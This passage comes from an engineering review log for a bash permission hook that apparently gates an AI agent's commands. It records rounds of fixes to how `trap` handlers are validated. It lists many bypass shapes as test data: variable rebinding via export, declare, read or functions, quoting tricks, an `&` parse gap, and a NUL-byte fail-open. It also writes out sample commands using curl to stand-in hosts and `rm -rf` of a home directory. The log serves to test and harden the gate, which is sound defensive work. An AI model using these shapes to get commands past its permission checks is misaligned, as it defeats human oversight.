holding). The other six methods are controls that pass on both sides by design:
they exist to prove the fix did not move them.

| test | pins |
|---|---|
| `test_trap_constant_expansion_semicolon_spelling_is_the_control` | the `;` spelling denied all along; the two spellings are now locked to the same verdict |
| `test_trap_flat_handler_with_a_constant_still_allows` | the no-newline spelling of the decoy's handler is harmless and still allows |
| `test_trap_constant_only_in_the_sigspec_does_not_disturb_recovery` | `S=EXIT; trap 'echo a\necho b' $S` still allows |
| `test_trap_unresolvable_constant_in_a_newline_handler_still_asks` | `$UNKNOWN` survives expansion, so `_TRAP_EXPANSION_CHARS` still asks |
| `test_trap_constant_handler_of_a_multiline_command_is_not_blanket_asked` | `X=/tmp/x\ntrap "rm -f $X" EXIT` keeps its **allow** — the fix resolves the constant on the recovered text instead of refusing to recover, so the ordinary shape did not degrade into a prompt |
| `test_recover_raw_handler_passes_through_a_flat_command` | the one remaining confident pass-through |

No `skipTest`, no bare `except` (the sweep harness in `/tmp` catches
`Exception` only to *report* rather than mask, and reported zero).

#### Measured end to end

Scratch workspace, fixture confirmed through `SettingsLoader.load_all_settings()`
before the runs (`deny: ['Bash(curl:*)']`, `allow: ['Bash(echo:*)']`):

```
                                                  pre-fix   post-fix
trap 'echo a\ncurl http://e/x' EXIT               deny   ->  deny   (round-2 fix, held)
X=http://e/x; trap 'echo a\ncurl $X' EXIT         allow  ->  deny   <<< BLOCKER
U=e/x;        trap 'echo a\ncurl http://$U' EXIT  allow  ->  deny   <<< BLOCKER
C=curl;       trap 'echo a\n$C http://e/x' EXIT   allow  ->  deny   <<< BLOCKER
P=/x;  trap 'echo a\ncurl http://e${P}' EXIT      allow  ->  deny   <<< BLOCKER (braced)
X=http://e/x; trap 'echo a; curl $X' EXIT         deny   ->  deny   (control)
trap 'echo a curl http://e/x' EXIT                allow  ->  allow  (control)
echo 'echo a\ncurl http://e/x' >/dev/null;
  trap 'echo a curl http://e/x' EXIT              deny   ->  ask    <<< MEDIUM false deny
trap 'echo a\ncurl $UNKNOWN' EXIT                 ask    ->  ask    (control)
S=EXIT; trap 'echo a\necho b' $S                  allow  ->  allow  (control)
trap 'echo a\necho b' EXIT                        allow  ->  allow  (guard, unchanged)
```

Against **this repo's own** merged settings (295 allow / 9 deny / 0 ask):

```
trap 'echo start\nrm -rf /home/anton/important' EXIT        ask   -> ask
D=/home/anton/important; trap 'echo start\nrm -rf $D' EXIT   allow -> ask   <<< headline restored
D=/home/anton/important\ntrap 'echo start\nrm -rf $D' EXIT   allow -> ask
X=/tmp/x\ntrap "rm -f $X" EXIT                               allow -> allow (no new prompt)
trap 'rm -f temp/review.lock' EXIT; python3 …                allow -> allow (task 25's command)
```

#### Differential sweep — 103,865 evaluations, zero loosening toward allow

20,773 commands × 5 settings profiles, pre-fix vs post-fix, in `/tmp`. Corpus:
every command-shaped string literal in the test suite, plus generated
permutations of handler × separator (`\n`, `;`, `&&`, `\r\n`, blank+indent) ×
constant spelling × quoting (`'…'`, `"…"`, `$'…'`) × sigspec, plus decoy,
double-trap, nested-trap and command-substitution shapes.

```
errors:                                    0
changed verdicts:                       1047
  tightened (away from allow):          1045   allow->ask 558, ask->deny 291, allow->deny 196
  loosened  (toward allow):                2   both deny->ask, both decoy shapes (the MEDIUM fix)
commands with NO `trap` token that changed:  0
allow->ask that are not (trap AND collapsing whitespace): 0
flat commands (no collapsible whitespace): 7,526 x 5 = 37,630 evaluations, 0 differing verdicts
```

- **Not one transition ends at `allow`.** The only two "loosened" rows are
  `deny -> ask` on decoy shapes — precisely the false-deny class the MEDIUM
  finding named. Nothing moves to a silent allow.
- **All 196 `allow -> deny` rows are the bypass being closed**, every one of them
  in the `deny: ['Bash(curl:*)']` profile with a `curl` payload behind a newline
  plus a constant. ~~A deny can now only come from a *unique* provable candidate,
  so no new false deny is reachable: ambiguity asks.~~
  **REFUTED in round 4 — do not rely on the struck-through sentence.** Uniqueness
  proves which raw *token* the handler came from; it says nothing about what `$X`
  will be worth when the trap FIRES. 27 of those rows were themselves wrong: for
  a single-quoted handler bash expands at fire time, so round 3 both authorised
  commands bash would run differently (HIGH 1) and hard-denied commands that are
  in fact harmless (MEDIUM 1, a genuinely new false deny reachable from this very
  sweep). See "Review round 4" below.
- **Blast radius is exactly `trap` + a raw command whose whitespace collapses.**
  Zero non-trap commands changed; the flat fast path is verdict-identical over
  37,630 evaluations.

#### LOW — recorded, not a defect

`for`, `done` and `fi` are in **both** `SAFE_BUILTINS` and
`SCAFFOLDING_KEYWORDS`, so round 2's `noop_reveal=True` exposed them to the tier
check. Measured:

```
                      no deny list    deny: ['Bash(<tok>:*)']
for i in 1 2          allow           deny     (was allow before round 2)
done                  allow           deny     (was allow)
fi                    allow           deny     (was allow)
```

Consistent with §2.1's intent — an operator who writes `deny: ['Bash(for:*)']`
means it, and the shortcut must not silently ignore it — but round 2's log did
not mention it, so it is recorded here. (The wider `SAFE_BUILTINS ∩
NOOP_BUILTINS` overlap is the 14 tokens `break continue export getopts local
read readonly return set shift ulimit umask unset wait`, already covered by
round 2's MEDIUM 1.)

#### Suite

`python3 tests/run_all_tests.py`

```
before:  Ran 1349 tests ... OK (skipped=1)      # test_headless_spawn
after:   Ran 1359 tests ... OK (skipped=1)      # +10, same single skip
```

#### Residual risk (round 3)

1. **Still not installed.** Unchanged — `./install-claude-config.sh` has not run;
   `~/.claude/hooks/pretool_hook.py` is still a pre-fix copy.
2. **Ambiguity and non-recovery both ask.** Two distinct raw tokens that collapse
   (modulo expansion) to the same handler, or none at all, make the trap prompt.
   Two synthetic shapes in the sweep moved `deny -> ask` this way. That is the
   rule working, and the safe direction — but it means a *genuinely* denied
   handler can prompt instead of hard-denying when a decoy makes its source
   unprovable. Taking the strictest verdict across candidates would restore the
   deny and reintroduce the false deny, so it was rejected.
3. **`_expand_constants` is not reassignment-aware *inside* a handler.** At top
   level it is (last write before the use wins, by offset), but an assignment
   that lives inside the quoted handler string is never extracted, so a handler
   that rebinds a name it also uses is expanded with the *outer* binding:

   ```
                                                    pre-fix   post-fix
   X=echo; X=curl; $X http://e/x                     deny   ->  deny    (top level: correct)
   X=echo; trap 'X=curl; $X http://e/x' EXIT         allow  ->  allow   (handler: wrong)
   X=echo; trap 'X=curl\n$X http://e/x' EXIT         allow  ->  allow   (handler: wrong)
   ```

   The `;` spelling already behaved this way before round 3, so this is not a
   regression and not something the round-3 fix introduced — the fix
   deliberately makes the newline spelling agree with the flat one rather than
   diverge from it. Out of scope for task 28; it belongs with any future pass
   over `_expand_constants`.
4. **Recovery still depends on `raw_command` being threaded** (round 2 residual
   item 2 stands), and now on `const_assignments` being threaded alongside it. A
   future caller that passes one without the other degrades to a prompt, not to
   an allow — the failure mode is now safe, but it is still a footgun.
5. **All three workspace shortcuts still outrank deny** — see the corrected
   round-2 residual item 4 above. Task 30.
6. Round 1's residual items **1, 2, 3, 5, 7, 8** and round 2's items **1, 2, 3**
   still stand; round 2's item 4 is corrected in place above.


### Review round 4 — 2026-08-27 (fixer pass, final)

Round 3's review **failed** on one narrow finding plus its mirror image, both in
the same place: `_expand_constants` resolves a handler's `$VAR` against the
binding in effect at the trap's **registration** offset, which is the wrong
moment for a **single-quoted** handler. Operator decision for this round: keep
`trap` in `SAFE_BUILTINS`, fix the deferred binding, and make the reviewer's
ground-truth harness a permanent part of the suite. Files touched:
`.claude/hooks/pretool_hook.py`, `tests/test_integration_pretool.py`, this file.
**Still not installed** — `./install-claude-config.sh` has not been run;
everything below was measured against the **repo** copy.

#### HIGH 1 / MEDIUM 1 — a single-quoted handler binds LATE

bash expands a *double-quoted* handler when the `trap` builtin runs, so the
registered string is fixed at that moment and the validator's model is exact. A
*single-quoted* handler is stored verbatim and expanded when the signal **fires**
— after every later assignment. Confirmed against real bash (`trap -p EXIT` read
with the trap cleared before exit, so nothing ran):

```
$ bash -c "X=echo; trap 'echo a
> \$X http://e/x' EXIT; X=curl; trap -p EXIT; trap - EXIT"
trap -- 'echo a
$X http://e/x' EXIT             <- stored UNEXPANDED; X is `curl` at exit

$ bash -c "X=echo; trap \"echo a
> \$X http://e/x\" EXIT; X=curl; trap -p EXIT; trap - EXIT"
trap -- 'echo a
echo http://e/x' EXIT           <- expanded at registration; validator agrees
```

So round 3 authorised `echo http://e/x` while bash ran `curl http://e/x`
(HIGH 1), and in the mirror spelling hard-denied a command whose handler is
`echo http://e/x` (MEDIUM 1 — a false deny, which blocks with no human rescue,
epic 22 H1). Both break round 3's own governing rule: a substitution that cannot
be *proven* correct must ask, never allow and never deny on a guess.

**The fix** (the reviewer's minimal one, taken as given). New predicate
`_handler_binding_is_deferred` (`pretool_hook.py`), called from
`_trap_handler_verdict` *before* recovery, marker
`trap_handler_deferred_binding`: if the handler's raw token is **single-quoted**
and holds a `$NAME` / `${NAME}` that has a standalone assignment at an offset
**greater** than the trap's, the trap asks. Double-quoted handlers are untouched
— there the validator and bash agree and a prompt would be pure noise.

Supporting changes, both about not letting two code paths drift apart (round 1's
lesson: two candidate builders that disagree are a new bypass):

- `_matching_raw_handler_tokens` — one raw-token scan, shared by
  `_recover_raw_handler` (which wants the *recovered* text) and the new predicate
  (which wants the *raw* spelling, to see the quoting regime and the unexpanded
  `$NAME`s). `_recover_raw_handler`'s behaviour is unchanged.
- `_resolve_constant` — `_expand_constants`' resolution rule factored out.
- `_single_quoted_var_names` (module level) — a quote-state walk that reports only
  the `$NAME`s inside single quotes, so `$'…'` (which also suppresses expansion)
  counts and a `$NAME` in a double-quoted span does not.

**Decided differently from a first attempt, and why.** The predicate first
compared the registration-time and fire-time resolutions and asked only when they
*differed* — tighter, fewer prompts. That is **unsound**: a later assignment
inside a conditional is still collected as standalone, so the last one by offset
is not necessarily the binding at fire time —
`V=echo; trap '$V x' EXIT; if …; then V=curl; else V=echo; fi` would compare
equal and allow while bash may run `curl x`. Existence of a later write is
provable from the text; its outcome is not. The blunt rule shipped.

The hole was never about newlines: the flat spelling
(`X=echo; trap '$X http://e/x' EXIT; X=curl`) defers identically and was equally
wrong. Both are fixed by the same predicate.

#### The property test, wired into the suite permanently

`TestTrapHandlerAgainstRealBash` in `tests/test_integration_pretool.py` (that
file, not a new module, so `tests/run_all_tests.py`'s explicit `TEST_MODULES`
table needs no edit and the runner is untouched). For each generated command it
asks **real bash** what handler actually got registered and asserts:

```
verdict(whole command)  ==  verdict(the handler bash registered)   or  'ask'
```

The `or ask` is not slack — `ask` is the validator's honest "I cannot prove what
this registers" and is the safe direction on both sides. Everything else is a
divergence: an `allow` where the handler is denied is the bypass this task
exists to close; a `deny` where the handler is allowed is a false deny.

*Reading the ground truth.* One `bash -c` per case:
`exec 3>&1; exec >/dev/null 2>&1; <case>; trap -p >&3; trap - EXIT HUP INT QUIT
TERM USR1 USR2 ERR DEBUG RETURN; printf '@@DONE@@\n' >&3`. The disposition is
read, then **every** signal is cleared before the shell exits, so no handler can
fire. The `@@DONE@@` sentinel proves that line was reached — a case bash cannot
parse raises `RuntimeError` instead of being silently read as "no trap".
`test_probe_never_lets_a_handler_fire` proves the safety empirically rather than
by inspection: it registers `printf x > <tmp>/fired`, runs the probe, asserts the
file does **not** exist, then runs the same command without the probe and asserts
it **does** — so the first assertion is testing something.

*Payload inertness.* Every payload is `printf`, `echo` or `pwd`. "Denied" is
simulated by `deny: ['Bash(echo:*)']` in the fixture, never by a command that
would do anything. `test_corpus_is_deterministic_and_inert` enforces it: no word
from a forbidden list (`rm`, `curl`, `wget`, `dd`, `sh`, …) may appear anywhere
in the corpus, and outside quotes the only redirect target permitted is
`/dev/null` (handler redirects such as `> /etc/cron.d/pwn` live inside quotes and
never run). `true`/`false`/`:` were rejected as payloads — they are
`NOOP_BUILTINS` and auto-allow past the deny list, which would have made the
whole corpus vacuous.

*Determinism and cost.* Seed `20260827`, corpus pinned at **240** cases: six
enumerated cross-product spines (handler bodies × quoting; every top-level
context × quoting; every context × both deferred-binding shapes; every sigspec;
every assignment layout × constant spelling; nesting) plus a seeded sample of the
full space to top up. Tags are asserted unique. The scan is cached on the class
so the property test and the task-31 bookkeeping share one pass: **~1.0 s** of
bash (240 processes at ~4 ms), 1.08–1.22 s for the whole class including
interpreter start. No batching needed.

*Coverage.* Separators `;`, `&&`, `||`, `|`, newline and `&`; both quoting
regimes; sigspecs `EXIT INT TERM "EXIT INT" SIGUSR1 0`; assignments before, after,
before-and-after (both orders) and rebound-to-the-same-value; nesting at two and
three levels; redirects inside and outside the workspace; the round-3 decoy shape.
Two placement rules, both forced by bash semantics and by safety rule 1: `|`
never sits immediately before the trap (both sides of a pipeline are subshells,
so the trap would register where the parent cannot see it and there would be
nothing to compare — it is covered as a neighbouring pipeline and inside the
handler), and `&` appears only **before** the trap (`trap … &` backgrounds the
registration into a subshell whose exit would *fire* the handler).

#### `&` — the known-failing set, and how it retires itself

`&` is in the corpus and is **not** fixed here: the parser does not treat it as a
command separator, so `printf ok & trap 'echo boom' EXIT` normalizes to ONE
sub-command whose head is `printf` and the `trap` — handler and all — is never
seen. That is [`tasks/31_ampersand_not_a_separator.md`](./31_ampersand_not_a_separator.md).

Eight cases are listed by tag in `_TASK_31_KNOWN_FAILING`, with a comment naming
task 31. No `skipTest`, nothing silently omitted. The list is exact in **both**
directions and that is the whole mechanism:

- an **unlisted** case that violates the property fails
  `test_validator_verdict_matches_the_handler_bash_registered`;
- a **listed** case that stops violating fails
  `test_task_31_known_failing_list_is_exact`, naming the entry to delete.

Verified by mutating a `/tmp` copy in both directions: adding a passing tag to the
list failed the exactness test; removing a genuinely-failing tag failed the
property test. When task 31 lands, whoever does it deletes entries from that list
and the property tightens automatically, with no other change to this test.

Note what the property can and cannot see. It compares validator-to-validator, so
a parser defect that hits both sides equally is invisible to it: `&` *inside* a
handler (`trap 'printf ok & echo boom' EXIT`) passes, because the handler is
validated through the same parser that mis-parses the whole command. Only the
top-level `&` cases, where the mis-parse swallows the trap itself, show up.

#### Correction to round 3's §5

Round 3's sweep bullet claimed *"all 196 `allow -> deny` rows are the bypass being
closed … no new false deny is reachable"*. **Refuted** (the bullet is struck
through in place above). Uniqueness of the recovered candidate proves which raw
token the handler came from; it proves nothing about the value `$X` will hold when
the trap fires. 27 rows of round 3's own sweep were wrong in one direction or the
other, and MEDIUM 1 is exactly the new false deny that bullet said was
unreachable.

#### Defect (b) is NARROWED, not closed

**Corrected in round 5.** This section named task 31 as the one remaining gap.
That was wrong when written: seven live `allow` bypasses of defect (b) were open
at the time (the six rebind spellings and the double-quoted earlier-rebind case
above), none of them anything to do with `&`. Read the rest of this section as
"the *parser-level* gap", which is what it actually establishes.

Handler validation can never be more faithful than the parser it delegates to.
While task 31 is open, `trap 'echo ok & rm -rf …' EXIT` **allows** — the handler
is read, but the parser hands back one sub-command headed `echo`, so the `rm` is
seen as an argument. Task 28's own machinery is doing its job; the gap is
upstream. Defect (b) should be described as *narrowed* until task 31 lands, at
which point the property test above tightens by itself and proves the closure.

#### LOW — pre-existing, recorded, not fixed here

A NUL byte in a redirect target raises `ValueError` out of `_resolve_target_path`
(`pretool_hook.py:772` region, via `os.path`/`lstat`), which `main()`'s blanket
`except Exception` catches and turns into `sys.exit(0)` — **fail open**:

```
>>> v.validate_bash_command('echo hi > /tmp/a\x00b')
ValueError: lstat: embedded null character in path
```

63 of 9,014 fuzz inputs in the round-3 review hit it. It is the hook-wide
fail-open policy rather than anything in the trap path, it predates task 28, and
it is out of scope here — but a validator that exits 0 on an exception is a
permission gate that an input can switch off, and it deserves its own task.

#### Tests — watched to fail first

Written against the fix, then run against a `/tmp` mirror carrying the round-3
(pre-fix) hook — `cp -a` of `.claude/hooks` with only the
`_handler_binding_is_deferred` call site neutralised; **the repo tree was never
reverted**. 12 tests added (7 in `TestSafeBuiltinsTierOrdering`, 5 in
`TestTrapHandlerAgainstRealBash`). Verbatim, on the pre-fix hook:

```
FAIL: test_trap_single_quoted_handler_with_a_later_binding_does_not_allow
      AssertionError: 'allow' != 'ask'          <<< HIGH 1
      cmd  X=echo; trap 'echo a\n$X http://e/x' EXIT; X=curl
FAIL: test_trap_single_quoted_handler_with_a_later_binding_does_not_deny
      AssertionError: 'deny' != 'ask'           <<< MEDIUM 1
      cmd  X=curl; trap 'echo a\n$X http://e/x' EXIT; X=echo
FAIL: test_trap_single_quoted_deferred_binding_asks_in_every_spelling (7 subTests)
      (cmd="X=echo; trap '$X http://e/x' EXIT; X=curl")            'allow' != 'ask'
      (cmd="X=curl; trap '$X http://e/x' EXIT; X=echo")            'deny'  != 'ask'
      (cmd="X=echo; trap 'echo a\n${X} http://e/x' EXIT; X=curl")  'allow' != 'ask'
      (cmd="U=e/x; trap 'echo a\necho http://$U' EXIT; U=other")   'allow' != 'ask'
      (cmd="X=echo; trap 'echo a\n$X http://e/x' EXIT; X=$HOME")   'allow' != 'ask'
      (cmd="X=echo; trap 'echo a\n$X http://e/x' EXIT && X=curl")  'allow' != 'ask'
      (cmd="X=echo\ntrap 'echo a\n$X http://e/x' EXIT\nX=curl")    'allow' != 'ask'
FAIL: test_validator_verdict_matches_the_handler_bash_registered (27 subTests)
      e.g. (tag='const-arg/single/EXIT/pre-post/bare')
      AssertionError: 'allow' not found in ('deny', 'ask') : verdict for the
      command (allow) is neither the verdict for the handler bash registered
      (deny) nor 'ask'
        command:  "V=printf; trap 'printf ok\n$V http://e/x' EXIT; V=echo"
        registered handler: 'printf ok\n$V http://e/x'
      e.g. (tag='const-arg/single/EXIT/post-pre/bare')
      AssertionError: 'deny' not found in ('allow', 'ask') : verdict for the
      command (deny) is neither the verdict for the handler bash registered
      (allow) nor 'ask'
        command:  "V=echo; trap 'printf ok\n$V http://e/x' EXIT; V=printf"
        registered handler: 'printf ok\n$V http://e/x'

Ran 62 tests in 1.131s
FAILED (failures=36)
```

The 27 property-test subTests split 17 HIGH-1-direction (`allow` where the
handler bash registered is denied) and 10 MEDIUM-1-direction (`deny` where it is
allowed); every one carries a `single`-quoted tag. **All 27 pass after the fix, leaving only the 8 pinned `&`
cases**, which are excluded by tag and separately asserted to still fail.

Four of the twelve are controls that pass on both sides by design, and are what
would catch an over-tightened fix:

| test | pins |
|---|---|
| `test_trap_double_quoted_handler_still_expands_at_registration` | `"…$X…"` keeps `allow` / `deny`; the fix must not touch the regime bash resolves eagerly |
| `test_trap_single_quoted_handler_without_a_later_binding_still_resolves` | an assignment only *before* the trap resolves normally; `X=/tmp/x\ntrap "rm -f $X" EXIT` is unchanged |
| `test_trap_deferred_binding_only_fires_for_the_name_the_handler_uses` | a later `Y=curl` says nothing about a handler using `$X`; still `allow` |
| `test_probe_never_lets_a_handler_fire` / `test_probe_reads_what_bash_registers` | the oracle itself, before anything is concluded from it |

`test_handler_binding_is_deferred_unit` pins the predicate directly and does
**not** fail on the mirror (only the call site was neutralised there, not the
method) — it is a rule pin, not a bypass repro.

#### Suite

`python3 tests/run_all_tests.py`

```
before:  Ran 1359 tests in 39.198s ... OK (skipped=1)   # test_headless_spawn
after:   Ran 1371 tests in 39.749s ... OK (skipped=1)   # +12, same single skip
```

Runtime delta from the property test: **+1.08 s** measured on the module in
isolation (`test_integration_pretool.py`: 213 tests / 0.647 s → 225 tests /
1.726 s), of which ~1.0 s is the 240 bash processes. Well inside the ~10 s
budget. No `skipTest`, no bare `except` — a missing `bash` raises an
`AssertionError` from `setUpClass` rather than skipping.

#### Differential sweep — 117,625 evaluations, zero loosening toward allow

23,525 commands × 5 settings profiles, pre-fix vs post-fix, in `/tmp`. Corpus:
every string literal in `tests/*.py` plus generated permutations of handler ×
separator (`\n ; && || | & \r\n` blank+indent) × constant spelling × quoting
(`'…'`, `"…"`, `$'…'`) × sigspec × assignment tail, plus decoy, substitution,
backtick and nested-trap shapes. Profiles: `deny-curl`, `deny-echo`, `ask-trap`,
`empty`, `wide-allow`.

```
errors:                                            0
changed verdicts:                               4401
  tightened (away from allow):                  4401   allow->ask 2088, deny->ask 2313
  loosened  (toward allow):                         0
transitions ENDING at allow:                        0
changed commands with NO `trap` token:              0
changed commands with no single quote at all:       0
distinct changed commands:                       1734
  ... without a single-quoted $VAR:                  0
  ... without a later assignment of that name:       0
```

- **Not one transition ends at `allow`.** Only two transitions exist at all, and
  both are toward the prompt: `allow -> ask` is the HIGH-1 bypass closing,
  ~~`deny -> ask` is the MEDIUM-1 false deny being withdrawn.~~
  **REFUTED in round 5 — do not rely on the struck-through clause.** The round-4
  reviewer's independent sweep found **600 of 1,050** of those rows carry a
  *literal* denied command inside the handler — `curl http://evil` written out,
  not produced by expanding anything — so they were provable denies being thrown
  away, not false denies being withdrawn. Same species of overclaim as round 3's:
  a whole transition class labelled by the one explanation the author had in
  mind. See round 5's MEDIUM fix below.
- ~~**Blast radius is exactly the stated trigger.** Every one of the 1,734
  distinct changed commands has a `$VAR` inside single quotes *and* a standalone
  assignment of that same name after the trap. Nothing else moved anywhere.~~
  **REFUTED in round 5.** The sentence is true of what *moved* and worthless as a
  safety claim: it describes the reach of round 4's trigger, and the trigger was
  the defect. "Standalone assignment" is `extract_assignments`, which returns only
  bare whole-statement `KEY=VALUE` groups, so every other way bash rebinds a name
  was outside the blast radius **and outside the fix** — six live bypasses, all
  measured `allow` under round 4:

```
X=echo; trap '$X http://e/x' EXIT; export X=curl
X=echo; trap '$X http://e/x' EXIT; declare X=curl
X=echo; trap '$X http://e/x' EXIT; read X <<< curl
X=echo; trap '$X http://e/x' EXIT; printf -v X curl
X=echo; trap '$X http://e/x' EXIT; for X in curl; do :; done
X=echo; trap '$X http://e/x' EXIT; f(){ X=curl; }; f
```

  And the DOUBLE-quoted regime, which rounds 3 and 4 exempted on the grounds that
  "bash expands those at registration and the validator agrees", was broken the
  same way — the validator agrees only if it resolves the binding bash has, and it
  resolves it from that same blind map, so an *earlier* rebind the map cannot see
  shadows the standalone one it can (found by the manager, not by the round-4
  review):

```
X=echo; export X=curl;  trap "$X http://e/x" EXIT   -> allow   (bash registers `curl …`)
X=echo; declare X=curl; trap "$X http://e/x" EXIT   -> allow   (bash registers `curl …`)
export X=curl;          trap "$X http://e/x" EXIT   -> ask     (control: nothing resolvable)
```

#### Measured end to end

Scratch fixture confirmed through `SettingsLoader.load_all_settings()` before the
runs (`allow: ['Bash(echo:*)']`, `deny: ['Bash(curl:*)']`, workspace `/tmp`):

```
                                                    pre-fix   post-fix   bash registers
X=echo; trap 'echo a\n$X http://e/x' EXIT; X=curl   allow  ->  ask       echo a\n$X …   <<< HIGH 1
X=curl; trap 'echo a\n$X http://e/x' EXIT; X=echo   deny   ->  ask       echo a\n$X …   <<< MEDIUM 1
X=echo; trap '$X http://e/x' EXIT; X=curl           allow  ->  ask       $X …           (flat spelling)
X=curl; trap '$X http://e/x' EXIT; X=echo           deny   ->  ask       $X …
X=echo; trap "echo a\n$X http://e/x" EXIT; X=curl   allow  ->  allow     echo a\necho … (control)
X=curl; trap "echo a\n$X http://e/x" EXIT; X=echo   deny   ->  deny      echo a\ncurl … (control)
X=curl; trap 'echo a\n$X http://e/x' EXIT           deny   ->  deny      (control, no later write)
X=echo; trap 'echo a\n$X http://e/x' EXIT           allow  ->  allow     (control, no later write)
trap 'echo a\n$X http://e/x' EXIT                   ask    ->  ask       (control, unknown name)
```

Against **this repo's own** merged settings (295 allow / 9 deny / 0 ask, read via
`SettingsLoader.load_all_settings()`):

```
                                                              pre-fix   post-fix
D=/tmp/safe; trap 'rm -rf $D' EXIT; D=/home/anton/important    allow  ->  ask   <<< headline
X=echo; trap 'echo a\n$X http://e/x' EXIT; X=curl              allow  ->  ask
X=curl; trap 'echo a\n$X http://e/x' EXIT; X=echo              allow  ->  ask
X=echo; trap 'trap "$X http://e/x" EXIT' EXIT; X=curl          allow  ->  ask   (nested)
X=echo; trap "echo a\n$X http://e/x" EXIT; X=curl              allow  ->  allow (double-quoted)
X=echo; trap 'echo a\n$X http://e/x' EXIT; Y=curl              allow  ->  allow (other name)
D=/home/anton/important; trap 'echo start\nrm -rf $D' EXIT     ask    ->  ask
X=/tmp/x\ntrap "rm -f $X" EXIT                                 allow  ->  allow
trap 'rm -f temp/review.lock' EXIT; python3 tests/…            allow  ->  allow (task 25's command)
trap - EXIT                                                    allow  ->  allow
```

#### Residual risk (round 4)

1. **Still not installed.** `~/.claude/hooks/pretool_hook.py` remains a pre-fix
   copy; `./install-claude-config.sh` must run before any of this is live.
2. **Defect (b) is narrowed, not closed, until task 31 lands** — see above. The
   property test already carries the eight failing cases and will retire them
   itself.
3. **Assignments *inside* the handler are still not modelled** (round 3 residual
   item 3, unchanged). `X=echo; trap 'X=curl; $X http://e/x' EXIT` still allows:
   the inner `X=curl` is not a standalone statement of the outer command, so it
   never reaches `const_assignments` and the new predicate cannot see it either.
   The same limit applies to a name rebound in a function the handler calls.
4. **The property test is validator-to-validator on the handler side.** It proves
   the two verdicts agree; it cannot see a parser defect that hits both sides
   equally (the `&`-inside-a-handler case above). Its oracle for *which handler
   is registered* is real bash and that half is exact.
5. **Fire-time context is modelled, not observed.** To validate a single-quoted
   (template) handler the harness prepends the assignments the generator inserted,
   so the validator resolves the last write — which is the fire-time binding for a
   straight-line command. A corpus with conditional assignments would need a
   different oracle. The corpus is straight-line by construction.
6. **More prompts on the deferred shape.** Any single-quoted handler naming a
   variable that is written again later now asks, including when the rewrite is to
   the same value. That is deliberate (see "Decided differently" above); the cure
   for noise is a narrow allowlist entry for the handler's command, or the
   double-quoted spelling, not re-blinding the parser.
7. **Recovery still depends on `raw_command` and `const_assignments` being
   threaded** (round 2 item 2 / round 3 item 4). The new predicate takes the same
   two arguments and returns `False` without them — i.e. a future caller that
   forgets them loses this check silently. `validate_bash_command` is the only
   production entry point and passes both.
8. **All three workspace shortcuts still outrank deny** — task 30. Round 1's
   residual items **1, 2, 3, 5, 7, 8**, round 2's **1, 2, 3**, and round 3's
   **1, 2, 3, 4, 5** otherwise stand as written.

---

### Review round 5 — 2026-08-27 (fixer pass)

Round 4 failed review. Not on a detail: on the **approach**. Four rounds in a row
tried to keep constant expansion inside `trap` handlers and bound the damage by
enumerating the ways a variable can be rebound, and four rounds in a row shipped
a list with holes in it. The operator's decision was to stop enumerating.

#### The rule

> A `trap` handler whose **raw** text — as written in the command, before this
> validator expanded anything — contains a `$` or a backtick cannot be vouched
> for: **ask**. Both quoting regimes. Unconditionally. No dependence on whether
> an assignment is visible, where it sits, or what form it takes.

The rationale, now carried in `_trap_handler_verdict`'s docstring so the next
reader gets it before the next idea: **the registered handler is a template.**
`trap` stores a string; the string becomes a command later, in an environment
this validator has no model of. A single-quoted handler is expanded when the
signal FIRES, so every later write to a name counts; a double-quoted one is
expanded at registration, so every *earlier* write counts — and the map the
validator resolves from, `BashCommandParser.extract_assignments`, sees only bare
standalone `KEY=VALUE` statements in either direction. The class is closed here
by construction rather than by list.

A **deny still stands**. The rule downgrades `allow -> ask`; it never turns a
deny into a prompt (epic 22 invariant 1).

#### What that deleted

The enumeration machinery existed only to serve the approach that failed, and
dead machinery that looks authoritative is how the next reader gets misled:

| deleted | why it is dead |
|---|---|
| `_single_quoted_var_names` (module fn, 58 lines) | classified a `$NAME` by quoting regime; the rule does not care about the regime |
| `_handler_binding_is_deferred` (method, 62 lines) | asked "is this name rebound after the trap?" — the question with the holes in it |
| `_resolve_constant` (static method) | factored out of `_expand_constants` *only* so the trap path could ask for a fire-time value; inlined back into its one remaining caller |
| the `const_assignments` thread through `_check_single_command` → `_trap_handler_verdict` → `_recover_raw_handler` → `_matching_raw_handler_tokens` | the trap path no longer expands anything |
| the expansion arm of `_matching_raw_handler_tokens` (and its `(raw, recovered)` pair) | `handler` is now read pre-expansion, so a source token matches it **literally**; round 2's "match modulo expansion" rule is gone with the reason for it |
| test `test_handler_binding_is_deferred_unit` | pinned the deleted predicate |

`pretool_hook.py` went from **2,239 to 2,135 lines** — 104 net removed, and that
is after a substantially longer docstring on the rule itself.

**Kept**, as instructed: `_recover_raw_handler` and the raw-token scan. Recovery
is still needed for newline-bearing literal handlers (BLOCKER 1 stays closed),
and rounds 3/4 certified it — 2,665 confident recoveries ground-truthed against
real bash with zero mismatches.

#### How the raw handler is obtained (the one new thread)

`const_assignments` came out; **`unexpanded_cmd`** went in — the same
sub-command before `_expand_constants` rewrote it. `_trap_handler_verdict`
reduces it with the same `_reduce_to_effective_command` that produced `cmd`, so
the two are token-aligned (`VAR=x trap …`, `env trap …`, `if trap …` all peel),
and reads the handler out of *that*.

If the reduced pre-expansion text is **not** headed `trap`, expansion is what
made this a trap at all (`T=trap; $T "$X …" EXIT`) — the invocation in front of
us is not the one that was written and its handler token cannot be located in the
source, so it asks (`trap_assembled_by_expansion`). Locating the handler
positionally rather than by content is deliberate: content matching would let a
`$`-free decoy token elsewhere in the command stand in for a `$`-bearing handler
and satisfy the rule on the wrong text.

#### MEDIUM (round-4 review) — a provable deny was downgraded to a prompt

`pretool_hook.py:1917-1919`: round 4 returned `ask` *before* the handler was
validated, so a deny that holds whatever the environment does was thrown away.

```
X=/tmp/a; trap 'curl http://evil; echo $X' EXIT; X=/tmp/b
    round 3: deny      round 4: ask      round 5: deny
```

`curl http://evil` is a literal; no binding of `$X` makes it something else. The
order is now: validate the handler's sub-commands → **deny wins** → then the `$`
rule → then ask/allow.

The reason this does not resurrect round 3's MEDIUM 1 (the *false* deny) is that
the sub-commands validated are the **raw** ones. A deny can no longer be
manufactured by an expansion, because there is no expansion:

```
X=curl; trap "echo a\n$X http://e/x" EXIT; X=echo
    round 3: deny (false — bash runs `echo …`)      round 5: ask
    (the head validated is `$X`, which matches no pattern)
```

Measured across the sweep: **every one of the 336 `deny -> ask` rows has no
literal denied command word in its raw handler** (all were expansion-manufactured
denies, correctly withdrawn), and **every one of the 756 `ask -> deny` rows has
one** (all were provable denies, correctly restored). Neither set is mixed.

